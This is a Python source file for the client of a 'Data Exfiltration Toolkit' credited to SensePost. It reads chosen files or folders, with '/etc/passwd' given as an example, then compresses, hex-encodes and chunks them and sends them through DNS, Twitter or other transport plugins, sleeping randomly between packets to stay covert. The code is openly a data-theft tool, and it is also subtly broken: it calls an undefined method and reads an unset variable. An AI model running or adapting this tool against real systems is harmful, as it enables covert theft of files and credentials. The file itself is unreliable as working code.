# -*- coding: utf-8 -*-
import argparse
import hashlib
import json
import os
import random
import signal
import string
import sys
import tempfile
import threading
import time
from os import listdir
from os.path import isfile, join
from random import randint
from zlib import compress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION = True
files = {}
threads = []
config = None


class Colors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'


def display_message(message):
    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)


def warning(message):
    display_message("%s%s%s" % (Colors.WARNING, message, Colors.ENDC))


def ok(message):
    display_message("%s%s%s" % (Colors.OKGREEN, message, Colors.ENDC))


def info(message):
    display_message("%s%s%s" % (Colors.OKBLUE, message, Colors.ENDC))


# Do a md5sum of the file
def md5(fname):
    hash_function = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash_function.update(chunk)
    return hash_function.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
}


class Exfiltration(object):
    def __init__(self, results):
        self.plugin_manager = None
        self.plugin = {}
        self.results = results

        path = "protocols/"
        plugin = {}

        # Load plugins
        sys.path.insert(0, path)
        for f in os.listdir(path):
            fname, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_plugin(fname):
                mod = __import__(fname)
                plugin[fname] = mod.Plugin(self, config["protocols"][fname])
                self.plugin['config'] = config["protocols"][fname]
                break

    def should_use_plugin(self, plugin_name):
        # if the plugin has been specified specifically (-p twitter)
        if self.results.plugin and plugin_name in self.results.plugin.split(','):
            return True
        else:
            return False

    def register_plugin(self, transport_method, functions):
        self.plugin[transport_method] = functions

    def get_plugin(self):
        plugin_name = random.sample(self.plugin, 1)[0]
        plugin_config = self.plugin['config']
        return plugin_name, plugin_config, self.plugin[plugin_name]['send']

    @staticmethod
    def log_message(mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)


class ExfiltrateFile(threading.Thread):
    def __init__(self, exfiltrate, file_to_send):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.exfiltrate = exfiltrate
        self.jobid = ''.join(random.sample(
            string.ascii_letters + string.digits, 7))
        self.checksum = md5(file_to_send)
        self.daemon = True

    def run(self):
        # registering packet
        plugin_name, plugin_config, plugin_send_function = self.exfiltrate.get_plugin()
        ok("Using {0} as transport method".format(plugin_name))

        warning("[!] Registering packet for the file")
        data = "%s|!|%s|!|REGISTER|!|%s" % (
            self.jobid, os.path.basename(self.file_to_send), self.checksum)
        plugin_send_function(data)

        time_to_sleep = randint(1, MAX_TIME_SLEEP)
        info("Sleeping for %s seconds" % time_to_sleep)
        time.sleep(time_to_sleep)

        # sending the data
        f = tempfile.SpooledTemporaryFile()
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(data)
        f.seek(0)
        e.close()

        packet_index = 0
        while True:
            data_file = f.read(NUM_BYTES_TO_READ).encode('hex')
            if not data_file:
                break
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
            ok("Using {0} as transport method".format(plugin_name))
            # info("Sending %s bytes packet" % len(data_file))

            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
            plugin_send_function(data)
            packet_index += 1

            time_to_sleep = randint(1, MAX_TIME_SLEEP)
            display_message("Sleeping for %s seconds" % time_to_sleep)
            time.sleep(time_to_sleep)

        # last packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))
        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
        plugin_send_function(data)
        f.close()
        sys.exit(0)


def signal_handler(bla, frame):
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, NUM_BYTES_TO_READ, COMPRESSION
    global threads, config

    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    results = parser.parse_args()

    if results.config is None:
        print "Specify a configuration file!"
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill client")

    MIN_TIME_SLEEP = int(config['min_sleep_time'])
    MAX_TIME_SLEEP = int(config['max_sleep_time'])
    # MIN_BYTES_READ = int(config['min_bytes_read'])
    # MAX_BYTES_READ = int(config['max_bytes_read'])
    # KEY = config['AES_KEY']
    COMPRESSION = bool(config['compression'])
    app = Exfiltration(results)

    if results.folder is None and results.file is None:
        warning("[!] Specify a file or a folder!")
        parser.print_help()
        sys.exit(-1)
    if results.folder:
        files_to_send = ["{0}{1}".format(results.folder, f) for f in listdir(results.folder)
                         if isfile(join(results.folder, f))]
    else:
        files_to_send = [results.file]

    threads = []
    for file_to_send in files_to_send:
        info("Launching thread for file {0}".format(file_to_send))
        thread = ExfiltrateFile(app, file_to_send)
        threads.append(thread)
        thread.daemon = True
        thread.start()

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break


if __name__ == '__main__':
    main()
